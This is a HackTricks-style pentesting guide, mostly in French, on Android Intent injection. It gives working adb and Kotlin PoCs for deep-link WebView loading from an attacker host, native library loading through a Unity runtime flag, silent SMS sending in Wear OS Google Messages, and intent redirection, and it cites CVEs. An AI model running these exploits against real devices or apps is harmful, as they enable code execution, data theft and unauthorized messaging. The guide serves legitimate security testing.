# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection exploite des composants qui acceptent des Intents contrôlés par un attaquant ou des données qui sont ensuite converties en Intents. Deux schémas très courants lors de pentests d'applications Android sont :

- Envoi d'extras spécialement conçus à des Activities/Services/BroadcastReceivers exportés qui sont ensuite redirigés vers des composants privilégiés non exportés.
- Déclenchement de deep links VIEW/BROWSABLE exportés qui transmettent des URLs contrôlées par l'attaquant vers des WebViews internes ou d'autres sinks sensibles.

## Deep links → WebView sink (URL parameter injection)

Si une app expose un deep link avec un schéma personnalisé tel que:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
et si l'Activity destinataire transmet le paramètre de requête `url` dans une WebView, vous pouvez forcer l'application à afficher du contenu distant arbitraire dans son propre contexte WebView.

PoC via adb:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS s'exécute à l'intérieur du profil WebView de l'application.
- Si JavaScript est activé (par défaut ou à cause d'un ordre de vérifications incorrect), vous pouvez énumérer/utiliser tout objet `@JavascriptInterface` exposé, voler les cookies/local storage de WebView, et effectuer un pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

Un bug récurrent consiste à activer JavaScript (ou d'autres paramètres permissifs de WebView) avant la fin de la dernière allowlist/vérification de l'URL. Si des helpers précoces acceptent votre deep link et que la WebView est configurée en premier, votre chargement final se produit avec JavaScript déjà activé même si les vérifications ultérieures sont défectueuses ou trop tardives.

What to look for in decompiled code:
- Plusieurs helpers qui parse/split/rebuild l'URL différemment (normalisation incohérente).
- Appels à `getSettings().setJavaScriptEnabled(true)` avant la dernière vérification host/path allowlist.
- Un pipeline du type : parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity-based Android apps typically use `com.unity3d.player.UnityPlayerActivity` (or `UnityPlayerGameActivity`) as the entry Activity. Unity’s Android template treats a special Intent extra named `unity` as a string of command-line flags for the Unity runtime. When the entry Activity is exported (default in many templates), any local app – and sometimes a website if `BROWSABLE` is present – can supply this extra.

A dangerous, undocumented flag leads to native code execution during very early process initialization:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Pourquoi cela fonctionne
- L'extra Intent `unity` est interprété comme des flags d'exécution Unity.
- Fournir le flag pre-init dirige Unity vers un chemin ELF contrôlé par l'attaquant au sein d'un namespace du linker autorisé (voir contraintes ci-dessous).

Conditions d'exploitation
- L'Activity d'entrée Unity est exportée (souvent vrai par défaut).
- Pour exploitation à distance en un clic via le navigateur : l'Activity d'entrée déclare aussi `android.intent.category.BROWSABLE` afin que les extras puissent être passés depuis une URL `intent:`.

Exploitation locale (même appareil)
1) Placez un ELF contenant le payload sur un chemin lisible par l'application victime. Le plus simple : embarquez une bibliothèque malveillante dans votre propre application attaquante et assurez-vous qu'elle soit extraite sous `/data/app/.../lib/<abi>/` en configurant dans le manifest de l'attaquant :
```xml
<application android:extractNativeLibs="true" ...>
```
2) Lancer l'activité Unity de la victime avec le flag pre-init du CLI dans l'extra `unity`. Exemple ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity appelle `dlopen("/data/.../libpayload.so", RTLD_NOW)` ; votre payload s'exécute dans le processus victime, héritant de toutes ses permissions d'application (caméra/micro/réseau/stockage, etc.) et de l'accès aux sessions/données in-app.

Remarques
- Le chemin exact `/data/app/...` varie selon les appareils/installations. Une application attaquante peut récupérer son propre répertoire de libs natifs à l'exécution via `getApplicationInfo().nativeLibraryDir` et le communiquer au déclencheur.
- Le fichier n'a pas besoin de se terminer par `.so` s'il est un ELF valide – `dlopen()` s'intéresse aux en-têtes ELF, pas aux extensions.

Exécution distante en un clic via le navigateur (conditionnel)
Si l'activity d'entrée Unity est exportée avec `BROWSABLE`, un site web peut transmettre des extras via une URL `intent:` :
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
Cependant, sur les versions récentes d'Android, les namespaces du dynamic linker et SELinux empêchent le chargement depuis de nombreux chemins publics (par ex., `/sdcard/Download`). Vous verrez des erreurs telles que :
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Stratégie de contournement : cibler les applications qui mettent en cache des octets contrôlés par l'attaquant dans leur stockage privé (par ex. HTTP caches). Parce que les chemins autorisés incluent `/data` et le répertoire privé de l’application, pointer `-xrsdk-pre-init-library` vers un chemin absolu à l’intérieur du cache de l’application peut satisfaire les contraintes du linker et conduire à une exécution de code. Cela reflète des patterns antérieurs cache-to-ELF RCE observés dans d’autres applications Android.


## Confused‑Deputy: SMS/MMS silencieux via ACTION_SENDTO (Wear OS Google Messages)

Certaines applications de messagerie par défaut exécutent incorrectement automatiquement des intents implicites de messagerie, les transformant en primitive confused‑deputy : toute application non privilégiée peut déclencher `Intent.ACTION_SENDTO` avec `sms:`, `smsto:`, `mms:`, ou `mmsto:` et provoquer un envoi immédiat sans interface de confirmation et sans la permission `SEND_SMS`.

Points clés
- Déclencheur : `ACTION_SENDTO` implicite + schéma URI de messagerie.
- Données : définir le destinataire dans l’URI, texte du message dans l’extra `"sms_body"`.
- Permissions : aucune (pas de `SEND_SMS`), dépend du gestionnaire SMS/MMS par défaut.
- Observé : Google Messages for Wear OS (corrigé en mai 2025). D’autres gestionnaires doivent être évalués de la même manière.

Payload minimal (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (aucune autorisation spéciale)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
Attack surface expansion (Wear OS)
- Tout composant capable de lancer des activities peut déclencher le même payload : Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- Si le handler par défaut envoie automatiquement, l'abus peut être en un seul tap ou entièrement silencieux depuis des contextes en background selon les politiques OEM.

Pentest checklist
- Résoudre `ACTION_SENDTO` sur la cible pour identifier le handler par défaut ; vérifier s'il affiche une UI de composition ou s'il envoie silencieusement.
- Tester les quatre schemes (`sms:`, `smsto:`, `mms:`, `mmsto:`) et les extras (`sms_body`, éventuellement `subject` pour MMS) pour vérifier les différences de comportement.
- Prendre en compte les destinations surtaxées/numéros à tarifs premium lors des tests sur appareils réels.


## Other classic Intent injection primitives

- startActivity/sendBroadcast utilisant des extras `Intent` fournis par un attaquant qui sont ensuite re-parsés (`Intent.parseUri(...)`) et exécutés.
- Composants proxy exportés qui redirigent des Intents vers des composants sensibles non-exportés sans vérifications de permission.

---

## Automating exported-component testing (Smali-driven ADB generation)

Quand des composants exportés attendent des extras spécifiques, deviner la forme du payload fait perdre du temps et génère des faux négatifs. Vous pouvez automatiser la découverte des clés/types directement depuis Smali et émettre des commandes adb prêtes à l'emploi.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: décompiler et scanner Smali pour des appels comme `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` afin d'inférer quels extras et champs sont consommés par chaque composant.
- Output: pour chaque Activity/Service/Receiver/Provider exporté, l'outil affiche une courte explication et la commande exacte `adb shell am ...`/`cmd content ...` avec les flags typés correctement.

Install
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
Utilisation
```bash
python apk-components-inspector.py target.apk
```
Exemple de sortie
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras cheat sheet (type-aware flags)
- Chaînes: `--es key value` | Tableau de chaînes: `--esa key v1,v2`
- Entiers: `--ei key 123` | Tableau d'entiers: `--eia key 1,2,3`
- Booléens: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URI (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Extra composant: `--ecn key com.pkg/.Cls`
- Extra chaîne nulle: `--esn key`
- Flags courants: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- Use `adb shell cmd content query|insert|update|delete ...` to hit ContentProviders without agents.
- Pour le probing SQLi, variez `--projection` et `--where` (aka selection) lorsque le provider sous-jacent est SQLite-backed.

Full-pipeline automation (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>Script utilitaire pour analyser et exécuter des commandes adb</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Exécuter sur l'appareil : l'inspecteur est Python-based et fonctionne dans Termux ou sur des rooted phones où `apktool`/`androguard` sont disponibles.

---

## Intent Redirection (CWE-926) – détection et exploitation

Modèle
- Un point d'entrée exporté (Activity/Service/Receiver) lit un Intent entrant et le transmet en interne ou en externe sans valider la source/les données, par ex. :
- `startActivity(getIntent())`
- `startActivity(intent)` où `intent` provient d'un extra comme `redirect_intent`/`next_intent`/`pending_intent` ou `Intent.parseUri(...)`.
- Faire confiance aux champs `action`/`data`/`component` sans vérifications ; ne pas vérifier l'identité de l'appelant.

Que rechercher dans Smali/Java
- Utilisations de `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Appels directs `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` sur des Intents influencés par l'attaquant.
- Absence de vérifications `getCallingPackage()`/`getCallingActivity()` ou de contrôles de permission personnalisés.

ADB PoC templates
- Proxy Activity transmettant un extra Intent à une Activity interne privilégiée :
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Service exporté qui prend en charge un parcelable `redirect_intent`:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver qui relaie sans validation:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags utiles pour un comportement de type singleTask
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
Exemples réels (impact variable) :

- CVE-2024-26131 (Element Android) : flux exportés conduisant à la manipulation de WebView, contournement de PIN et détournement de session.
- CVE-2023-44121 (LG ThinQ Service) : action de récepteur exportée `com.lge.lms.things.notification.ACTION` → effets au niveau système.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00) : redirection → accès arbitraire à des fichiers (avec interaction utilisateur).
- CVE-2022-36837 (Samsung Email < 6.1.70.20) : implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## Références

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
